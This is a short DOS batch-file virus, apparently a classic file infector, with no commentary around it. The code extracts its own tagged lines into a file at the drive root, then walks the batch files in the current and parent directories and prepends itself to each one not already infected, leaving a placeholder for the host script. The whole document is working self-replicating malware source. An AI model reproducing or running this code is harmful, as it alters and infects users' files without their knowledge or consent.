@echo off%_ViRuS%
if '%1=='ViRuS goto virus_%2
if exist \virus.bat goto ViRuS_1
if not exist %0.bat goto ViRuS_X
find "ViRuS"<%0.bat>\virus.bat
:ViRuS_1
command /c \virus.bat ViRuS 2
goto ViRuS_X
:ViRuS_2 
for %%a in (*.bat ..\*.bat) do call %0 ViRuS 3 %%a  
exit ViRuS
:ViRuS_3
find "ViRuS"<%3>nul
if not errorlevel 1 goto ViRuS_X
type \virus.bat>ViRuS
type %3>>ViRuS
move ViRuS %3>nul
exit ViRuS
:ViRuS_X
:: host batch goes here
